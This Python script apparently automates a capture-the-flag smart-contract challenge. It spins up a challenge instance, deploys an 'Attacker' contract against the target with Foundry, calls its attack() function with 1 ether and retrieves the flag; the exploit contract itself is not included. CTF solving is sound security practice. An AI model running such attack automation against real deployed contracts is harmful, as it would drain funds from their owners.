#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from __future__ import annotations

import argparse
import hashlib
import subprocess

import pwn

parser = argparse.ArgumentParser()
parser.add_argument(
    '--host',
    type=str, default="127.0.0.1",
    help="The host to connect to"
)
parser.add_argument(
    '--port',
    type=int, default=31337,
    help="The port to connect to on the host"
)
parser.add_argument(
    '--ticket',
    type=str, default="5283368213",
    help="The ticket to create the instance with"
)
parser.add_argument(
    '--verbose', action='store_true',
    help=(
        "Enable detailed exploit-Output. "
        "If this is not set, only the flag is getting printed"
    )
)
args = parser.parse_args()


def success(msg: str):
    pwn.log.success(msg)


def info(msg: str):
    if args.verbose:
        pwn.log.info(msg)


def failure(msg: str):
    pwn.log.failure(msg)


def create_instance(ticket: str) -> dict[str, str]:
    chall_connection = pwn.remote(args.host, args.port, level='error')

    chall_connection.sendlineafter(b"> ", b"1")
    chall_connection.sendlineafter(b"Ticket: ", ticket.encode())
    response = chall_connection.recvline().decode()

    if response.startswith("Invalid ticket"):
        m = hashlib.sha256(
            hashlib.sha256(ticket.encode()).digest() + ticket.encode('ascii')
        ).hexdigest()
        failure(f"The ticket {ticket} is invalid (HASH {m})")
        return None

    if response.startswith("An instance is already running!"):
        failure("An Instance for this ticket is already running!")
        return None

    chall_connection.recvuntil(b"Here's some useful information\n")
    instance_information = {}

    instance_information["UUID"] = chall_connection.recvline().\
        decode().partition(":")[2].strip()
    instance_information["RPC"] = chall_connection.recvline().\
        decode().partition(":")[2].strip()
    instance_information["PrivKey"] = chall_connection.recvline().\
        decode().partition(":")[2].strip()
    instance_information["SetupContract"] = chall_connection.recvline().\
        decode().partition(":")[2].strip()

    chall_connection.close()
    return instance_information


def destroy_instance(ticket: str) -> bool:
    chall_connection = pwn.remote(args.host, args.port, level='error')

    chall_connection.sendlineafter(b"> ", b"2")
    chall_connection.sendlineafter(b"Ticket: ", ticket.encode())
    response = chall_connection.recvline().decode()
    info(f"Instance responsed with: {response}")

    chall_connection.close()


def retrieve_flag(ticket: str) -> bool:
    chall_connection = pwn.remote(args.host, args.port, level='error')

    chall_connection.sendlineafter(b"> ", b"3")
    chall_connection.sendlineafter(b"Ticket: ", ticket.encode())
    flag = chall_connection.recvline().decode().strip()
    success(f"Flag: {flag}")

    chall_connection.close()


def main() -> int:
    instance_information = create_instance(args.ticket)

    if not instance_information:
        failure("Failed to create instance!")
        return 1

    for key in instance_information:
        info(f"{key}: {instance_information[key]}")

    # Retreive the Address off the deployed contract
    result = subprocess.run([
            "/root/.foundry/bin/cast",
            "call", instance_information["SetupContract"], "TARGET()(address)",
            "--rpc-url", instance_information["RPC"]
        ],
        capture_output=True,
    )

    if result.stderr:
        failure(f"Cast-Call returned {result.stderr} as STDERR")
        failure("Destroying Instance")
        destroy_instance(args.ticket)
        return -1

    target_contract = result.stdout.decode().strip()
    info(f"Target contract: {target_contract}")

    info("Deploy attacker's contract")
    result = subprocess.run([
            "/root/.foundry/bin/forge",
            "create", "--rpc-url", instance_information["RPC"],
            "--private-key",  instance_information["PrivKey"],
            "sources/Attacker.sol:Attacker",
            "--constructor-args", target_contract
        ],
        capture_output=True,
    )

    if result.stderr:
        failure(f"Forge-Create returned {result.stderr} as STDERR")
        failure("Destroying Instance")
        destroy_instance(args.ticket)
        return -2

    attacker_contract_deployment = {
        x.split(":")[0]: x.split(":")[1]
        for x in result.stdout.decode().strip().split("\n") if ":" in x
    }

    # Check if the contract was deployed to a address
    if "Deployed to" not in attacker_contract_deployment:
        failure("The Attack-Contract didn't seem to be deployed correctly")

    attacker_contract = attacker_contract_deployment["Deployed to"].strip()
    info(f"Attacker contract: {attacker_contract}")

    info("Run the attacker-contract")
    result = subprocess.run([
            "/root/.foundry/bin/cast",
            "send", attacker_contract, "attack()",
            "--rpc-url", instance_information["RPC"],
            "--value", "1ether",
            "--private-key",  instance_information["PrivKey"],
        ],
        capture_output=True,
    )

    for line in result.stdout.decode().split("\n"):
        if not line:
            continue
        info(line.strip())

    info("Check if the Challenge has been solved")
    result = subprocess.run([
            "/root/.foundry/bin/cast",
            "call", instance_information["SetupContract"], "isSolved()(bool)",
            "--rpc-url", instance_information["RPC"],
        ],
        capture_output=True
    )

    if result.stdout.decode().strip() == "true":
        info("Challenge seems to be solved, retrieve flag")
        retrieve_flag(args.ticket)

    failure("Destroying Instance")
    destroy_instance(args.ticket)

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
